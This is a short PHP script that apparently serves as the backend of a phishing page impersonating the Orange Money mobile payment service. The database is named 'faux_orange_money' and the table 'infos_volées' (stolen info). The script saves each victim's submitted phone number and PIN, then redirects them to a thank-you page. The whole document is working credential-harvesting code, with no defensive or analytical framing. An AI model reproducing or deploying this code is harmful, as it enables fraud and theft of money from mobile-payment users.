
<?php
$host = 'localhost';
$dbname = 'faux_orange_money';
$username = 'root';
$password = '';

try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $numero = $_POST["numero"];
        $pin = $_POST["pin"];

        $stmt = $conn->prepare("INSERT INTO infos_volées (numero, pin) VALUES (:numero, :pin)");
        $stmt->bindParam(':numero', $numero);
        $stmt->bindParam(':pin', $pin);
        $stmt->execute();

        header("Location: merci.html");
        exit();
    }
} catch (PDOException $e) {
    echo "Erreur : " . $e->getMessage();
}
?>
